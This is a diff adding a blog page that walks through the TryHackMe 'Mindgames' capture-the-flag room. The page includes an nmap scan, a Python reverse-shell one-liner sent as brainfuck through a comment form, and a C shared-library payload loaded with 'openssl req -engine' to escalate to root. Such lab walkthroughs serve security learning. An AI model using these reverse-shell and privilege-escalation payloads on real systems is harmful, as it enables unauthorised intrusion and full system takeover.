@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+   <!-- Bootstrap CSS -->
+   <link
+   href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+   rel="stylesheet"
+   integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+   crossorigin="anonymous"
+ />
+ <link rel="preconnect" href="https://fonts.googleapis.com" />
+ <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+ <!-- <link rel="stylesheet" href="/assets/css/thm.css" /> -->
+ <link rel="stylesheet" href="/assets/css/style.css" />
+   <title>Mindgames | Tryhackme</title>
+</head>
+<body>
+   <nav>
+      <ul>
+        <!-- <li style="float:left"><h4>dfdf</h4></li> -->
+        <li style="float:left"><a href="/"><h4>xf0lt</h4></a></li>
+        <li><a href="/posting/about.html">About</a></li>
+        <li><a href="/posting/post.html">Achive</a></li>
+      </ul>
+    </nav>
+
+   <!-- content -->
+   <div class="container">
+      <section>
+         <h2><a class="link" href="https://tryhackme.com/room/mindgames"> Tryhackme - Mindgames</a></h2><br>
+
+         <img class="img-head" src="/assets/images/mindgames.png" width=500px alt="mindgames tryhackme"> <br><br>
+
+         <h3 class="warning">DISCLAIMER</h3>
+         <blockquote>
+            <p>
+               <strong>Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only.</strong>
+            </p>
+         </blockquote><br>
+
+         <h2 class="scope">PORT SCANING</h2>
+   <pre><span> <span class="terminal">
+   ┌──(trysked㉿kali)-[~/vulnhub/deathnote]
+   └─$</span> nmap -sC -sV -Pn  10.10.102.54 
+   Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-29 21:16 WIB
+   Nmap scan report for 10.10.102.54
+   Host is up (0.34s latency).
+   Not shown: 998 closed tcp ports (conn-refused)
+   PORT   STATE SERVICE VERSION
+   22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+   | ssh-hostkey: 
+   |   2048 244f06260ed37cb8184240127a9e3b71 (RSA)
+   |   256 5c2b3c56fd602ff728344755d6f88dc1 (ECDSA)
+   |_  256 da168b14aa580ee174856fafbf6b8d58 (ED25519)
+   80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+   |_http-title: Mindgames.
+   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+   
+   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+   Nmap done: 1 IP address (1 host up) scanned in 104.14 seconds
+   
+   </span></pre><br>
+
+         <h2 class="scope">WEBSITE</h2>
+         <p>
+            first, before we go any further, let's check the website using the IP given by the machine. 
+            After we look at the web here we find a comment box and a few lines of brainfuck code
+         </p>
+         <img src="/assets/images/Mindgames-pict1.png" width=750px alt=""><br><br>
+
+         <p>After analyzing for a while, I tried to enter the brainfuck code into the comments column, what I found was an output "hello world" and a few lines of arithmetic.
+         </p>
+         <img src="/assets/images/mindgames-pict2.png" width=750px alt=""><br><br>
+
+         <h2 class="scope">REVERSE SHELL</h2>
+         <p>Then I tried to reverse shell, for you to do it you need to visit <a href="https://www.revshells.com/">https://www.revshells.com/</a>, then adjust your ip and port. After that convert it into a brainfuck code, for that you also need to visit the web <a href="https://www.splitbrain.org/_static/ook/">https://www.splitbrain.org/_static/ook/</a>, then enter the code in the victim's comment box. Below is the code I use</p>
+   <pre><span>
+   <!-- <span class="terminal"> -->
+   import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh") 
+   <!-- </span> -->
+   </span></pre>
+
+   <p>after I converted the reverse shell to brainfuck then I entered the code into the form box, and I got the shell</p>
+   <img src="/assets/images/mindgames-pict5.png" width=750px alt=""><br><br>
+
+   <p>after I got the shell, then I looked for the user.txt flag in the home directory, and here I got two directories mindgames and tryhackme, I tried to enter the tryhackme directory and it failed so the next step I entered the mindgames directory and we got the user.txt flag</p>
+   <img src="/assets/images/mindgames-pict6.png" width=750px alt=""><br><br>
+
+   <p>After I got the user flag, I tried to get root privileges by viewing the capabilities file with the command</p>
+   
+   <pre><span>
+                           getcap -r / 2>/dev/null
+   </span></pre>
+
+   <img src="/assets/images/mindgames-pict7.png" width=750px alt=""><br><br>
+
+   <p>here I see a vulnerability in openssl so next I make a script to exploit the vulnerable machine</p>
+
+   <h2 class="scope">ROOT</h2>
+
+   <p>first create a file on your machine with the existence of .c, here I named my file myshell.c</p>
+
+   <pre><span>
+      <span class="terminal">
+      ┌──(trysked㉿kali)-[~/thm]
+      └─$</span> touch myshell.c
+   </span></pre>
+ 
+   <p>then edit the myshell.c file with nano and enter the script below</p>
+
+   <pre><span>
+         #include <unistd.h>
+
+         __attribute__((constructor))
+         static void init() {
+            setuid(0);
+            execl("/bin/bash", "sh", null);
+         }
+   </span></pre>
+
+   <p>then compile the file using the command below</p>
+
+   <pre><span>
+      gcc -fPIC -o myshell.o -c myshell.c
+      gcc -shared -o myshell.so -lcrypto myshell.o
+   </span></pre>
+
+   <p>after that we send the file using the server on Python with the command below</p>
+
+   <pre><span>
+      python3 -m http.server
+   </span></pre>
+
+   <p>then we get it on the victim's machine before taking it, make sure you are already in the tmp directory, then do the command below</p>
+
+   <img src="/assets/images/mindgames-pict8.png" width=750px alt=""><br><br>
+
+   <p>after getting the file then grant access rights permission on the file with below command.</p>
+
+   <span><pre>
+         
+      chmod +x myshell.so
+   </pre></span>
+
+   <p>after we give access without taking much longer let's execute it with the following command to get root</p>
+
+   <pre><span>
+      openssl req -engine ./myshell.so
+   </span></pre>
+
+   <pre><span>
+      <span class="victims">sh-4.4~</span># whoami 
+      whoami
+      root
+      <span class="victims">sh-4.4~</span># ls
+      root.txt
+      <span class="victims">sh-4.4~</span># 
+      </span></pre>
+   <!-- <img src="/assets/images/ssh-alice.png" width=750px alt=""> <br><br> -->
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+   <h2 class="rooted">ROOTED</h2>
+   </section>
+   </div>
+   <!-- end content -->
+
+
+
+</body>
+</html>
